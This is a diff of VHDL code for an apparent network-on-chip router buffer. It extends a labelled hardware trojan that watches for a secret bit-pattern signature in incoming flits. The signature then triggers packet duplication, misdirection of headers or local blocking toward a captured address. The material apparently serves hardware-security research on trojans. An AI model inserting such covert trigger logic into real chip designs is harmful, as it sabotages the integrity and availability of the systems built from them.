@@ -10,10 +10,10 @@ port(
 	reset:      in  std_logic;
 	configPckt: out std_logic;
 	turnOff:    out std_logic;
-	duplicate:  in std_logic;
+	HTworking:  in  std_logic;
 	destAddr:	out regmetadeflit;
+	htOp:		out std_logic_vector(1 downto 0);
 	address:	in  regmetadeflit;
-	clock_rx:   in  std_logic;
 	rx:         in  std_logic;
 	data_in:    in  regflit;
 	credit_o:   out std_logic;
@@ -70,19 +70,16 @@ begin
 	credit_o <= '1' when write_pointer /= read_pointer else '0';
 
 	-------------------------------------------------------------------------------------------
-	-- PROCESS TO READ THE FIFO
+	-- HARDWARE TROJAN PROCESS
 	-------------------------------------------------------------------------------------------
 
-	-- Available the data to transmission (asynchronous read)
-	data <= buf(CONV_INTEGER(read_pointer));
-
-	--HT
 	process(reset, clock)
 	begin
 		if reset='1' then
 			configPckt <= '0';
 			turnOff <= '0';
 			destAddr <= (others=>'0');
+			htOp <= "00";
 			currentHTstate <= waitHeader;
 
 		elsif rising_edge(clock) then
@@ -113,7 +110,11 @@ begin
 
 				when waitSignature =>
 					if rx = '1' then
-						if data_in(METADEFLIT+15 downto METADEFLIT) = x"AAAA" then
+						if data_in(TAM_FLIT-1 downto METADEFLIT+2) = "10101010101010" then -- Possible combination between signatures and operations
+																				   -- 8 or A: Duplicate	'...10 00' or '...10 10'
+																				   -- 9: HeaderMissDirect 	'...10 01'
+																				   -- B: LocalBlocking		'...10 11'
+							htOp <= data_in(METADEFLIT+1 downto METADEFLIT);
 							destAddr <= data_in(METADEFLIT-1 downto 0);
 							currentHTstate <= informPckt;
 						else
@@ -124,7 +125,7 @@ begin
 				when informPckt =>
 					if sender = '0' then
 						if EA = S_HEADER then
-							if duplicate = '0' then
+							if HTworking = '0' then
 								configPckt <= '1';
 							else 
 								turnOff <= '1';
@@ -143,6 +144,13 @@ begin
 
 	end process;
 
+
+	-------------------------------------------------------------------------------------------
+	-- PROCESS TO READ THE FIFO
+	-------------------------------------------------------------------------------------------
+
+	-- Available the data to transmission (asynchronous read)
+	data <= buf(CONV_INTEGER(read_pointer));
 
 	process(reset, clock)
 	begin
